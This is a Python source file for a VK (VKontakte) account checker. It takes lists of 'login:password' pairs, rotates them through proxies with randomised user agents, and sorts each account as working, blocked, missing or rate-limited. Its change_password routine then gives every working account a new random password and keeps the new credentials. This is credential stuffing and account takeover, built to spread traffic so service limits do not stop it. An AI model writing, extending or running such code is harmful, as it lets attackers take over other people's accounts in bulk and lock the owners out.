import asyncio
import random
import string

import aiohttp
import requests
from vk_api.vk_api import vk_api
import logging

from src.schemas.tools import AccountCheckResult, AccountChangeResult
from src.utils.database_manager import DataBaseManager
from src.utils.rand_user_agent import get_random_user_agent

def generate_password(length=12):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

class AccountChecker:
    def __init__(self, database: DataBaseManager, concurrency_limit: int = 20):
        self.database = database
        self.concurrency_limit = concurrency_limit

    async def check(self, data):
        proxies = await self.database.proxy.get_all()
        if not proxies:
            raise RuntimeError("Нет доступных прокси")

        semaphore = asyncio.Semaphore(self.concurrency_limit)
        tasks = []

        for i, acc in enumerate(data.accounts):
            if ":" not in acc:
                continue
            login, password = acc.split(":", 1)
            proxy = proxies[i % len(proxies)]
            proxy_http = proxy.http
            tasks.append(self._check_one(login, password, proxy_http, semaphore))

        results = await asyncio.gather(*tasks)
        return [r for r in results if r]  # убрать None при ошибках

    async def _check_one(self, login: str, password: str, proxy_http: str, semaphore: asyncio.Semaphore):
        async with semaphore:
            try:
                async with aiohttp.ClientSession(
                        connector=aiohttp.TCPConnector(ssl=False),
                        headers={"User-Agent": get_random_user_agent()}
                ) as session:
                    # Мы всё равно используем sync VK API внутри run_in_executor
                    status = await asyncio.get_event_loop().run_in_executor(
                        None, self._sync_check, login, password, proxy_http
                    )
                    return AccountCheckResult(login=login, password=password, status=status)
            except Exception as e:
                logging.error(f"Ошибка при проверке {login}: {e}")
                return None

    def _sync_check(self, login: str, password: str, proxy_http: str) -> str:
        """Выполняется в пуле потоков (не блокирует event loop)"""
        import requests

        session = requests.Session()
        session.proxies.update({
            'http': proxy_http,
            'https': proxy_http
        })
        session.headers.update({
            "User-Agent": get_random_user_agent()
        })

        vk_session = vk_api.VkApi(login=login, password=password, session=session)
        vk_session.api_version = "5.251"
        vk_session.app_id = 6287487
        try:
            vk_session.auth()
            return "Work"
        except vk_api.AuthError as err:
            err_str = str(err).lower()
            if "blocked" in err_str:
                return "Blocked"
            elif "not exists" in err_str:
                return "NotExists"
            else:
                return "FloodControl"
        except Exception:
            return "Error"

    async def change_password(self, data):

        proxies = await self.database.proxy.get_all()
        index_proxy = random.randint(0, len(proxies)-1)

        new_accounts = []
        for acc in data.accounts:
            try:
                login, password = acc.split(":")
            except ValueError:
                continue

            proxy = proxies[index_proxy % len(proxies)]
            proxy_http = proxy.http
            index_proxy += 1

            session = requests.Session()
            session.proxies.update({
                'http': proxy_http,
                'https': proxy_http
            })
            session.headers.update({
                "User-Agent": (get_random_user_agent())
            })
            vk_session = vk_api.VkApi(login=login, password=password, session=session)
            vk_session.api_version = "5.251"
            vk_session.app_id = 6287487
            vk_session.token = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef01234"
            blocked = False
            flood_control = False
            not_exists = False
            try:
                vk_session.auth()
            except vk_api.AuthError as error_msg:
                if "blocked" in str(error_msg).lower():
                    blocked = True
                if "not exists" in str(error_msg).lower():
                    not_exists = True
                logging.error(error_msg)
                flood_control = True

            status = "Work"
            if flood_control:
                status = "FloodControl"

            if not_exists:
                status = "NotExists"

            if blocked:
                status = "Blocked"

            logging.info(f"Login: {login} Status: {status}")

            if status == "Work":
                new_password = generate_password()
                logging.info(f"Login: {login} NewPassword: {new_password} Status: {status}")

                vk = vk_session.get_api()
                try:
                    request = vk.account.changePassword(old_password=password, new_password=new_password)
                    logging.info(request)
                    new_token = request['token']
                    logging.info(new_token)
                    new_accounts.append(AccountChangeResult(login=login, password=new_password))
                except Exception as error_msg:
                    logging.info(error_msg)
                    new_accounts.append(AccountChangeResult(login=login, password=password + "\tОшибка"))
            else:
                new_accounts.append(AccountChangeResult(login=login, password=password + "\t" + status))

        return new_accounts